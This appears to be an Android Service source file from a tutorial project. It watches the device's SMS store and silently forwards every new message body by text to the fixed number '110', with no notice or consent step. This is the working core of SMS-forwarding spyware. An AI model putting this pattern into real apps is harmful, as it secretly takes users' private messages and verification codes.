package com.scxh.android.pattern;

import android.app.PendingIntent;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;

import com.scxh.android.receiver.SmsContentObserver;
import com.scxh.android.receiver.sms.SMS;

public class SMSService extends Service {
	private Handler mHandler = new Handler() {
		public void handleMessage(android.os.Message msg) {
			String body = (String) msg.obj;
			send("110",body);
		};
	};

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onCreate() {
		super.onCreate();
		ContentResolver resolver = getContentResolver();
		SmsContentObserver observer = new SmsContentObserver(mHandler, resolver);
		resolver.registerContentObserver(SMS.CONTENT_URI, true, observer);

	}

	// 发送信息
	private void send(String phone, String message) {

		PendingIntent pi = PendingIntent.getActivity(this, 0, new Intent(this,
				SmsMessage.class), 0);

		SmsManager sms = SmsManager.getDefault();

		sms.sendTextMessage(phone, null, message, pi, null);

	}
}
